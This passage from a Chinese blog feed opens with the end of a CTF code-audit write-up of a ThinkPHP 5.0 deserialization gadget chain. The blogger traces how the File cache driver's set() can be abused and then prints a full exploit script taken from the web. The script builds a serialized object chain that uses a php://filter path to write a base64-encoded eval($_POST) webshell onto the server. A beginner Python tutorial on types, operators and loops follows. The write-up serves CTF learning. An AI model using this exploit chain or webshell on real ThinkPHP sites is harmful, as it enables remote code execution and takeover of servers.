<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">block</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$message</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment"># style=getAttr $message=$attr</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeln(<span class="string">&quot;&lt;<span class="subst">&#123;$style&#125;</span>&gt;<span class="subst">&#123;$message&#125;</span>&lt;/<span class="subst">$style</span>&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::OUTPUT_NORMAL</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="variable">$messages</span>, <span class="literal">true</span>, <span class="variable">$type</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$newline</span> = <span class="literal">false</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::OUTPUT_NORMAL</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;write(<span class="variable">$messages</span>, <span class="variable">$newline</span>, <span class="variable">$type</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接在这里搜索write的定义的时候会转到Console类里面的，但是追踪之后会发现没有任何可以利用的点，而这里的$this-&gt;handle是我们可随意改变的，所以我们可以直接全局搜索是否有可利用的write方法</span></span><br></pre></td></tr></table></figure>

<p>可以在<code>Memcache</code>中找到至少是我们可以利用的<code>write</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$sessID</span>, <span class="variable">$sessData</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment"># $sessID=$attr $sessData=false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handler-&gt;set(<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;session_name&#x27;</span>] . <span class="variable">$sessID</span>, <span class="variable">$sessData</span>, <span class="number">0</span>, <span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;expire&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>直接搜索可利用的set方法，找了一圈下来发现set犯法都是三个参数，但是php是不在乎参数多少的</p>
<p><img src="https://img-blog.csdnimg.cn/9968013731d148989a715b159656e7b9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>在<code>File</code>类中找到似乎可以利用的<code>file_put_contents</code>，而data拼接里面存在exit，这种类型的以前是遇到过的，直接在filename那里用php伪协议绕过就好了，而同时要把我们要写入的一句话进行base64加密，同时不能让数据被压缩，所以<code>$this-&gt;options[&#39;data_compress&#39;]</code>要为false，然后只要文件写入成功了就好了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment"># $name=$attr $value=false $expire=0</span></span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$expire</span>)) &#123; <span class="comment"># $expire=0</span></span><br><span class="line">            <span class="variable">$expire</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">            <span class="variable">$expire</span> = <span class="variable">$expire</span>-&gt;getTimestamp() - time();</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="comment"># $name可控 getCacheKey对$name进行md5加密，然后加上php后缀并创建文件目录</span></span><br><span class="line">        <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;getCacheKey(<span class="variable">$name</span>, <span class="literal">true</span>); </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag &amp;&amp; !is_file(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="variable">$first</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = serialize(<span class="variable">$value</span>); <span class="comment"># 第一遍中的value不可控 由第二次为 PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = gzcompress(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable">$result</span> = file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>); <span class="comment"># 可以利用php伪协议绕过exit</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="keyword">$this</span>-&gt;setTagItem(<span class="variable">$filename</span>);</span><br><span class="line">            clearstatcache();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$auto</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = md5(<span class="variable">$name</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;cache_subdir&#x27;</span>]) &#123;</span><br><span class="line">            <span class="comment">// 使用子目录</span></span><br><span class="line">            <span class="variable">$name</span> = substr(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">2</span>) . DS . substr(<span class="variable">$name</span>, <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]) &#123;</span><br><span class="line">            <span class="variable">$name</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . DS . <span class="variable">$name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] . <span class="variable">$name</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$dir</span>      = dirname(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$auto</span> &amp;&amp; !is_dir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            mkdir(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">setTagItem</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag) &#123;<span class="comment"># $this-&gt;tag可控</span></span><br><span class="line">            <span class="variable">$key</span>       = <span class="string">&#x27;tag_&#x27;</span> . md5(<span class="keyword">$this</span>-&gt;tag);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tag = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;has(<span class="variable">$key</span>)) &#123;</span><br><span class="line">                <span class="variable">$value</span>   = explode(<span class="string">&#x27;,&#x27;</span>, <span class="keyword">$this</span>-&gt;get(<span class="variable">$key</span>));</span><br><span class="line">                <span class="variable">$value</span>[] = <span class="variable">$name</span>;</span><br><span class="line">                <span class="variable">$value</span>   = implode(<span class="string">&#x27;,&#x27;</span>, array_unique(<span class="variable">$value</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$value</span> = <span class="variable">$name</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;set(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="number">0</span>); <span class="comment"># 第二次进入get $value=$name 可控 所以要把要写入的内容也直接写进$path中</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>思路整理：</p>
<blockquote>
<p>1.首先从Windows类的__destruct方法开始，调用removeFiles方法，当对$this-&gt;files进行file_exits进行判断的时候触发toString方法</p>
<p>2.在Model类中找到toString方法，依旧是json调用toArray ，在这里可以实现对__call方法的调用，要求this-&gt;append数组不为空，并且数组里面的值不能是数组的类型，也不能存在<code>.</code>，在执行值所代表的方法的时候会返回一个类且这个类里面存在getBindAttr这个方法，而后面还有value=new Output()，所以 append[]=’getError’ this-&gt;error= OneToOne和Query的子类; this-&gt;parent=new Output();(Query)this-&gt;model = new Output(); </p>
<p>这里出现了一个矛盾，我们要求modelRelation 可以调用 getBindAttr，那modelRelation 最好是OneToOne，但是在getRelationData方法中我们要利用modelRelation 去调用model方法，而此时要用Query类，那么只能找OneToOne和Query的子类的</p>
<p>3.Output里面的__call方法，要求this-&gt;styles = [‘getAttr’]; this-&gt;handle=new Memcache();</p>
<p>4.Memcache类中的write方法，this-&gt;handle=new File();从而调用File类里面的set方法，this-&gt;options[‘cache_subdir’]=false；this-&gt;options[‘prefix’]=false;$this-&gt;options[‘path’]=(php伪协议);this-&gt;options[‘data_compress’]=false;</p>
</blockquote>
<p>网上找的exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Windows</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$files</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = [<span class="variable">$files</span>]; <span class="comment">//$file =&gt; /think/Model的子类new Pivot(); Model是抽象类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = <span class="variable">$output</span>;  <span class="comment">//$this-&gt;parent=&gt; think\console\Output;</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;xxx&quot;</span>=&gt;<span class="string">&quot;getError&quot;</span>);     <span class="comment">//调用getError 返回this-&gt;error</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;error = <span class="variable">$modelRelation</span>;               <span class="comment">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::__construct(<span class="variable">$output</span>, <span class="variable">$modelRelation</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">HasOne</span> <span class="title">extends</span> <span class="title">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">OneToOne</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;query = <span class="variable">$query</span>;    <span class="comment">//$query指向Query</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];<span class="comment">// $value值，作为call函数引用的第二变量</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Query</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$model</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;model = <span class="variable">$model</span>; <span class="comment">//$this-&gt;model=&gt; think\console\Output;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Output</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle =<span class="variable">$handle</span>; <span class="comment">//$handle-&gt;think\session\driver\Memcached</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="variable">$handle</span>; <span class="comment">//$handle-&gt;think\cache\driver\File</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">options</span>=<span class="title">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options=[</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">3600</span>, </span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>, </span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>  =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#x27;</span>, <span class="comment">// $_POST[&#x27;ccc&#x27;]</span></span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tag = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">Memcached</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>(<span class="title">new</span> \<span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>());</span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">new</span> think\console\Output(<span class="variable">$Memcached</span>);</span><br><span class="line">    <span class="variable">$model</span> = <span class="keyword">new</span> think\db\Query(<span class="variable">$Output</span>);</span><br><span class="line">    <span class="variable">$HasOne</span> = <span class="keyword">new</span> think\model\relation\HasOne(<span class="variable">$model</span>);</span><br><span class="line">    <span class="variable">$window</span> = <span class="keyword">new</span> think\process\pipes\Windows(<span class="keyword">new</span> think\model\Pivot(<span class="variable">$Output</span>,<span class="variable">$HasOne</span>));</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$window</span>);</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$window</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buu刷题</tag>
        <tag>因为不知道该干什么所以代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>浅学亿下python</title>
    <url>/2022/02/13/%E6%B5%85%E5%AD%A6%E4%BA%BF%E4%B8%8Bpython/</url>
    <content><![CDATA[<h2 id="PYTHON"><a href="#PYTHON" class="headerlink" title="PYTHON"></a>PYTHON</h2><h3 id="1-python"><a href="#1-python" class="headerlink" title="1. python"></a>1. python</h3><p>1.cmd（命令提示符）中输入python，进行程序编写</p>
<p>2.声明一个python文件，然后在该目录下<code>python xx.py</code>执行python文件</p>
<p>3.pycharm编译</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello world&quot;</span>)</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h5 id="0x01-pycharm以及注释"><a href="#0x01-pycharm以及注释" class="headerlink" title="0x01: pycharm以及注释"></a>0x01: pycharm以及注释</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="0x02-数据类型"><a href="#0x02-数据类型" class="headerlink" title="0x02: 数据类型"></a>0x02: 数据类型</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查询变量数据类型</span></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数字（int、float、complex、bool）</span><br><span class="line"></span><br><span class="line">字符串（str）</span><br><span class="line"></span><br><span class="line">字典（dict）</span><br><span class="line">a = &#123;&#125;</span><br><span class="line"></span><br><span class="line">元组（Tuple）</span><br><span class="line">b = ()</span><br><span class="line"></span><br><span class="line">列表（list）</span><br><span class="line">c = []</span><br></pre></td></tr></table></figure>

<p>变量命名规则和c差不多</p>
<p>命名规范</p>
<h5 id="0x03-python基本运算符"><a href="#0x03-python基本运算符" class="headerlink" title="0x03:python基本运算符"></a>0x03:python基本运算符</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">算术运算符：</span><br><span class="line">+ - * / % ** </span><br><span class="line">地板除：//</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">比较运算符：</span><br><span class="line">== &lt; &gt; &lt;= &gt;= !=</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#逻辑运算符：</span><br><span class="line">#and or not</span><br><span class="line">and 条件必须都为true返回true</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">优先级：</span><br><span class="line">()-&gt;not-&gt;and-&gt;or</span><br></pre></td></tr></table></figure>

<h5 id="0x04"><a href="#0x04" class="headerlink" title="0x04:"></a>0x04:</h5><h5 id="输入与输出"><a href="#输入与输出" class="headerlink" title="输入与输出"></a>输入与输出</h5><p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name = &#x27;张三&#x27;</span><br><span class="line">sex = &#x27;male&#x27;</span><br><span class="line">print(&#x27;我的名字是%s，是%s&#x27;%(name,sex))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">格式化输出；</span><br><span class="line">使用 format</span><br><span class="line">name = &#x27;yuer&#x27;</span><br><span class="line">print(&#x27;name:&#123;&#125;&#x27;.format(name))</span><br></pre></td></tr></table></figure>

<p>输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name = input(&#x27;pleast input your name:&#x27;)</span><br></pre></td></tr></table></figure>

<h3 id="2-判断语句与循环控制"><a href="#2-判断语句与循环控制" class="headerlink" title="2.判断语句与循环控制"></a>2.判断语句与循环控制</h3><h5 id="0x01-if-else语句"><a href="#0x01-if-else语句" class="headerlink" title="0x01:if-else语句"></a>0x01:if-else语句</h5><p>流程：计算机执行代码的顺序</p>
<p>流程控制：对计算机执行代码顺序的管理，只有流程控制才能实现在开发当中的业务逻辑</p>
<p>流程控制分类：顺序流程、选择（分支）流程、循环流程</p>
<p>选择流程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">双分支：</span><br><span class="line">if 条件表达式:</span><br><span class="line">    ………………</span><br><span class="line">else:</span><br><span class="line">    ………………</span><br><span class="line"></span><br><span class="line">多分支：</span><br><span class="line">if 条件表达式:</span><br><span class="line">    ………………</span><br><span class="line">elif 条件表达式:</span><br><span class="line">    ………………</span><br><span class="line">else:</span><br><span class="line">    ………………</span><br></pre></td></tr></table></figure>

<p>条件表达式：比较运算符/逻辑运算符/复合运算符</p>
<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = int(input(&quot;请输入数字：&quot;))</span><br><span class="line">if a &gt;= 1:</span><br><span class="line">	print(&quot;true&quot;)</span><br><span class="line">elif a == 0:</span><br><span class="line">	print(&quot;false&quot;)</span><br><span class="line">else:</span><br><span class="line">	print(&quot;a little true&quot;)</span><br></pre></td></tr></table></figure>

<h5 id="0x02-while循环"><a href="#0x02-while循环" class="headerlink" title="0x02:while循环"></a><strong>0x02:while循环</strong></h5><p>循环流程·：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while 条件表达式:</span><br><span class="line">	逻辑代码</span><br><span class="line">	</span><br><span class="line">for ... in 可迭代集合对象:</span><br><span class="line">	逻辑代码</span><br></pre></td></tr></table></figure>

<p><strong>while语法特点：</strong></p>
<p>1.循环必须有一个初始值</p>
<p>2.必须有条件表达式</p>
<p>3.要有自增或自减变量，否则会死循环</p>
<p>4.循环次数不确定，依靠循环条件结束</p>
<p>5.主要用于判断</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while true:</span><br><span class="line">	python代码段</span><br></pre></td></tr></table></figure>

<h5 id="0x03-for循环"><a href="#0x03-for循环" class="headerlink" title="0x03:for循环"></a><strong>0x03:for循环</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">格式：</span><br><span class="line">for 临时变量 in 字符串、列表等:</span><br><span class="line">	执行代码</span><br><span class="line">	……</span><br></pre></td></tr></table></figure>

<p>语法特点：</p>
<p>1.遍历操作，依次地取集合容器中的每个值</p>
<p>适用于已知的循环次数（可迭代对象的遍历</p>
<p>eg：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tags=<span class="string">&#x27;abcdefg&#x27;</span>  <span class="comment">#字符串类型本身就是一个字符类型的集合</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> tags:</span><br><span class="line">	<span class="built_in">print</span>(item)</span><br><span class="line">	<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p><code>range函数</code> 此函数可以生成一个数据集合列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">range函数使用：</span><br><span class="line">range(起始值:结束:步长) 步长不能为0</span><br><span class="line">range(1,100,1)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    <span class="built_in">sum</span> += i</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure>

<p><u>for—else</u></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">k = key</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">if</span> i == k:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;未找到key&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line">username = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    zh = <span class="built_in">input</span>(<span class="string">&quot;账号：&quot;</span>)</span><br><span class="line">    pd = <span class="built_in">input</span>(<span class="string">&quot;密码：&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> zh == username <span class="keyword">and</span> pd == password:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;登陆成功&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;账号或者密码错误，请重新登录&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

